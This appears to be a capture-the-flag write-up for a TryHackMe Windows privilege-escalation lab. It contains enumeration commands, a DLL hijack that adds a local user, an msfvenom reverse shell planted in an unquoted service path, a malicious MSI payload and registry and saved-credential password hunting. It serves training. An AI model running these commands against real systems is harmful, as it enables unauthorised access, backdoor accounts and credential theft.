<!-- TOC -->

- [Windows Privesc](#windows-privesc)
    - [Information Gathering](#information-gathering)
        - [User Enumeration](#user-enumeration)
        - [Collecting system information](#collecting-system-information)
        - [Searching files](#searching-files)
        - [Patch level](#patch-level)
        - [Network Connections](#network-connections)
        - [Scheduled Task](#scheduled-task)
        - [Drivers](#drivers)
        - [Antivirus](#antivirus)
    - [Tools of the trade](#tools-of-the-trade)
        - [WinPEAS](#winpeas)
        - [PowerUp](#powerup)
        - [Windows Exploit Suggester](#windows-exploit-suggester)
        - [Metasploit](#metasploit)
    - [Vulnerable Software](#vulnerable-software)
    - [DLL Hijacking](#dll-hijacking)
    - [Unquoted Service Path](#unquoted-service-path)
    - [Quick Wins](#quick-wins)
        - [Always Install Elevated](#always-install-elevated)
        - [Passwords](#passwords)

<!-- /TOC -->

# Windows Privesc

[Windows Privesc Room](https://tryhackme.com/room/winprivesc)

Learn the fundamentals of Windows privilege escalation. From enumeration to exploitation, get hands-on with privilege escalation techniques seen in the industry today.

## Information Gathering

### User Enumeration

```cmd
whoami /priv
net user
net user <USER>
qwinsta
query session
net localgroup
net localgroup <GROUP>
```

### Collecting system information

```cmd
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
hostname
```

### Searching files

```cmd
findstr /si password *.txt
```

### Patch level

```cmd
wmic qfe get Caption,Description,HotFixID,InstalledOn
```

### Network Connections

```cmd
netstat -ano
```

### Scheduled Task

```cmd
schtasks
schtasks /query /fo LIST /v
```

### Drivers

```cmd
driverquery
```

### Antivirus

```cmd
sc.exe query windefend
```

## Tools of the trade

### WinPEAS

```cmd
winpeas.exe > outputfile.txt
```

### PowerUp

```cmd
powershell.exe -nop -exec bypass
Import-Module .\PowerUp.ps1
Invoke-AllChecks
```

### Windows Exploit Suggester

```cmd
windows-exploit-suggester.py –update
windows-exploit-suggester.py --database 2021-09-21-mssb.xls --systeminfo sysinfo_output.txt
```

### Metasploit

```bash
multi/recon/local_exploit_suggester
```

## Vulnerable Software

```cmd
wmic product
wmic product get name,version,vendor
wmic service list brief
wmic service list brief | findstr  "Running"
sc.exe qc <SERVICE>
```

- Searchsploit
- Metasploit
- Exploit-DB
- Github
- Google

## DLL Hijacking

```c
/* windows_dll.c */
#include <windows.h>

BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved) {
    if (dwReason == DLL_PROCESS_ATTACH) {
        system("cmd.exe /k whoami > C:\\Temp\\dll.txt");
        ExitProcess(0);
    }
    return TRUE;
}
```

```bash
x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
```

rhost:

```cmd
wget -O hijackme.dll ATTACKBOX_IP:PORT/hijackme.dll
sc stop dllsvc & sc start dllsvc
```

| Title | IP Address |
| :---- | :---- |
| DLL_Hijack | 10.10.123.106 |

```c
/* hijackme.c */
#include <windows.h>

BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved) {
    if (dwReason == DLL_PROCESS_ATTACH) {
        system("cmd.exe /k net user jack Password123");
        ExitProcess(0);
    }
    return TRUE;
}
```

```bash
x86_64-w64-mingw32-gcc hijackme.c -shared -o hijackme.dll
```

lhost:

```bash
python3 -m http.server 80
```

rhost:

```cmd
wget 10.6.31.75:80/hijackme.dll -O C:\Temp\hijackme.dll
sc.exe stop dllsvc; sc.exe start dllsvc
xfreerdp /u:jack /p:Password123 /v:10.10.123.106
```

`Documents` folder:

> `THM-8377492093`

## Unquoted Service Path

```cmd
wmic service get name,displayname,pathname,startmode
```

| Title | IP Address |
| :---- | :---- |
| Unquoted_SP | 10.10.225.253 |

```cmd
sc.exe qc unquotedsvc
.\accesschk64.exe /accepteula -uwdq "C:\Program Files\Unquoted Path Service\"
```

> `RW BUILTIN\Users`

lhost:

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.6.31.75 LPORT=9999 -f exe -o Common.exe
python3 -m http.server 80
```

```bash
msfconsole
use exploit/multi/handler
set lhost 10.6.31.75
set lport 9999
set payload windows/x64/shell_reverse_tcp
run
```

rhost:

```cmd
wget 10.6.31.75:80/Common.exe -O "C:\Program Files\Unquoted Path Service\Common.exe"
sc.exe start unquotedsvc
```

lhost:

```cmd
cd ../..
dir flagUSP /s
```
> ` Directory of C:\Users\Cora\Documents 10/14/2021  11:54 PM 16 flagUSP.txt`

```cmd
powershell
cat C:\Users\Cora\Documents\flagUSP.txt
```

> `THM-636729273483`

## Quick Wins

### Always Install Elevated

```cmd
reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
```

```bash
msfvenom -p windows/x64/shell_reverse_tcpLHOST=ATTACKING_10.10.225.253 LPORT=LOCAL_PORT -f msi -o malicious.msi
```

```cmd
C:\Users\user\Desktop>msiexec /quiet /qn /i C:\Windows\Temp\malicious.msi
```

### Passwords

```cmd
cmdkey /list
runas /savecred /user:admin reverse_shell.exe
```

```cmd
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s
```
